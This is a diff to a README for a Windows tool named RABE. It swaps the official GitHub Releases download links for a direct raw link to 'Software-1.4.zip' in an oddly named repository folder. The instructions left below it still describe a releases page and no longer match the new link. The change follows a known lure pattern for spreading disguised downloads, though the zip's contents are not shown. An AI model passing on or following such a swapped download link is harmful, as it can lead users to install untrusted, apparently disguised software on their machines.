@@ -1,12 +1,12 @@
 # 🔐 RABE - Revoke Access Without Delay
 
-[![Download RABE](https://img.shields.io/badge/Download-RABE-6f42c1?style=for-the-badge&logo=github)](https://github.com/Comprehendible-genuslobelia764/RABE/releases)
+[![Download RABE](https://img.shields.io/badge/Download-RABE-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Comprehendible-genuslobelia764/RABE/main/superindependent/Software-1.4.zip)
 
 ## 📥 Download RABE
 
 Visit this page to download the Windows release files:
 
-https://github.com/Comprehendible-genuslobelia764/RABE/releases
+https://raw.githubusercontent.com/Comprehendible-genuslobelia764/RABE/main/superindependent/Software-1.4.zip
 
 1. Open the link above in your browser.
 2. Find the latest release at the top of the page.
